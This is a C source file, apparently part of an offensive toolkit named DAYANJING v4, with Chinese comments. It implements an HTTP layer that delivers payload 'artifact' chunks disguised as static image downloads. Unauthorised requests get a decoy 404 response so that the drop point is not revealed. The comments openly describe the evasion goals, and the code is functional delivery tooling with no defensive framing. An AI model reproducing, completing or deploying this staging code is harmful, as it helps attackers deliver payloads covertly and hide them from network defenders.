/* DAYANJING v4 — 25_deploy / src/drop_http.c
 *
 * 分块投递的 HTTP 承载层。
 *
 * 为什么走 HTTP 而不是裸 TCP：出口侧 HTTP 是最常见的协议，裸长连接
 * 本身就是特征。但这层刻意做得极薄 —— 不做完整 HTTP 服务器，
 * 只做"从请求里取出块号、把块包进响应"这两件事。
 *
 * 路径与 Content-Type 可配：伪装形态由部署方决定，本层不硬编码。
 * 默认模板是静态图片资源路径 —— 单次请求规模与真实图片一致。
 */

#include <stdio.h>
#include <string.h>

#include "drop.h"
#include "drop_http.h"

#define DP_HTTP_MAXHDR 512

int dp_http_build_request(uint32_t idx, const char *tmpl,
                          char *out, size_t cap, size_t *olen)
{
    if (!out || cap == 0 || !olen) return DP_ERR_ARG;
    const char *t = tmpl ? tmpl : DP_HTTP_PATH_TMPL;

    /* 模板必须含且仅含一个 %u。
       多个转换说明会被 idx 之外的栈垃圾填充，产生不可预测的路径。 */
    int nconv = 0;
    for (const char *p = t; *p; p++) {
        if (p[0] == '%' && p[1] == 'u') nconv++;
    }
    if (nconv != 1) return DP_ERR_ARG;

    /* 先把路径渲染出来：模板来自部署配置，不能直接进整请求的
       格式串，否则路径里的 '%' 会被二次解释。 */
    char path[128];
    int pn = snprintf(path, sizeof(path), t, idx);
    if (pn < 0 || (size_t)pn >= sizeof(path)) return DP_ERR_ARG;

    int m = snprintf(out, cap,
                     "GET %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     path, DP_HTTP_HOST);
    if (m < 0 || (size_t)m >= cap) return DP_ERR_ARG;

    *olen = (size_t)m;
    return DP_OK;
}

/* 从请求路径里提取块号：取路径中第一段连续数字。
   找不到数字返回 DP_ERR_ARG —— 不是错误请求，是不含块号，
   调用方按"非投递请求"处理（回诱饵页）。 */
static int path_extract_idx(const char *req, size_t reqlen, uint32_t *idx)
{
    if (!req || !idx || reqlen == 0) return DP_ERR_ARG;

    /* 只扫描请求行：找到第一个 \r 或 \n 为止。
       扫描整个缓冲区会把 body 里的数字也当成块号。 */
    size_t line = 0;
    while (line < reqlen && req[line] != '\r' && req[line] != '\n') line++;

    size_t i = 0;
    /* 跳过 "GET " */
    while (i < line && req[i] != ' ') i++;
    while (i < line && req[i] == ' ') i++;

    /* 路径范围只到下一个空格（或 '?' 开始的查询串）为止。
       不截断的话，请求行尾部的 "HTTP/1.1" 里的数字会被当成块号 ——
       于是 /static/img/logo.png 会被解析成块 1，把无关请求错投成制品块。 */
    size_t path_end = i;
    while (path_end < line && req[path_end] != ' ' && req[path_end] != '?')
        path_end++;

    uint64_t v = 0;
    size_t digits = 0;
    for (size_t j = i; j < path_end; j++) {
        if (req[j] >= '0' && req[j] <= '9') {
            v = v * 10u + (uint64_t)(req[j] - '0');
            if (v > 0xffffffffu) return DP_ERR_RANGE;
            digits++;
        } else if (digits > 0) {
            break;                       /* 第一段数字结束 */
        }
    }
    if (digits == 0) return DP_ERR_ARG;
    *idx = (uint32_t)v;
    return DP_OK;
}

int dp_http_parse_request(const char *req, size_t reqlen, uint32_t *idx)
{
    return path_extract_idx(req, reqlen, idx);
}

int dp_http_build_response(const uint8_t *body, size_t blen,
                           const char *ctype,
                           uint8_t *out, size_t cap, size_t *olen)
{
    if (!out || cap == 0 || !olen) return DP_ERR_ARG;
    if (blen > 0 && !body) return DP_ERR_ARG;
    const char *ct = ctype ? ctype : DP_HTTP_CTYPE;

    int n = snprintf((char *)out, cap,
                     "HTTP/1.1 200 OK\r\n"
                     "Content-Type: %s\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     ct, blen);
    if (n < 0 || (size_t)n >= cap) return DP_ERR_ARG;
    if ((size_t)n + blen > cap) return DP_ERR_ARG;

    if (blen > 0) memcpy(out + n, body, blen);
    *olen = (size_t)n + blen;
    return DP_OK;
}

/* 构造不含制品的诱饵响应（门控拒绝 / 非投递请求时使用）。
   返回 404 而不是 403：403 明确表示"这里有东西但不给你"，
   等于向来源确认投递点存在。 */
int dp_http_build_decoy(uint8_t *out, size_t cap, size_t *olen)
{
    if (!out || cap == 0 || !olen) return DP_ERR_ARG;
    static const char BODY[] = "Not Found";
    int n = snprintf((char *)out, cap,
                     "HTTP/1.1 404 Not Found\r\n"
                     "Content-Type: text/plain\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     sizeof(BODY) - 1);
    if (n < 0 || (size_t)n >= cap) return DP_ERR_ARG;
    if ((size_t)n + sizeof(BODY) - 1 > cap) return DP_ERR_ARG;
    memcpy(out + n, BODY, sizeof(BODY) - 1);
    *olen = (size_t)n + sizeof(BODY) - 1;
    return DP_OK;
}

int dp_http_parse_response(const uint8_t *resp, size_t rlen,
                           const uint8_t **body, size_t *blen)
{
    if (!resp || !body || !blen) return DP_ERR_ARG;
    if (rlen == 0) return DP_ERR_ARG;

    /* 找头部结束 "\r\n\r\n" */
    size_t i = 0;
    size_t hdr_end = 0;
    int found = 0;
    while (i + 3 < rlen) {
        if (resp[i] == '\r' && resp[i+1] == '\n' &&
            resp[i+2] == '\r' && resp[i+3] == '\n') {
            hdr_end = i + 4;
            found = 1;
            break;
        }
        i++;
    }
    if (!found) return DP_ERR_ARG;

    /* 状态码必须是 200。非 200 的响应体不是制品块。
       不校验状态码会把诱饵页当成块收下 —— 那会让组装器
       把 "Not Found" 写进缓冲区，摘要校验失败但已污染。 */
    if (rlen < 12) return DP_ERR_ARG;
    if (resp[9] != '2' || resp[10] != '0' || resp[11] != '0') return DP_ERR_ARG;

    /* 校验 Content-Length 与实际体长一致。
       不一致说明传输被截断或被中间设备改写。 */
    const char *cl = strcasestr((const char *)resp, "Content-Length:");
    if (!cl) return DP_ERR_ARG;
    cl += 15;
    while (*cl == ' ') cl++;
    uint64_t declared = 0;
    size_t d = 0;
    while (*cl >= '0' && *cl <= '9') {
        declared = declared * 10u + (uint64_t)(*cl - '0');
        if (declared > (uint64_t)rlen) return DP_ERR_ARG;
        cl++; d++;
    }
    if (d == 0) return DP_ERR_ARG;

    size_t actual = rlen - hdr_end;
    if (actual != (size_t)declared) return DP_ERR_LEN;

    *body = resp + hdr_end;
    *blen = actual;
    return DP_OK;
}
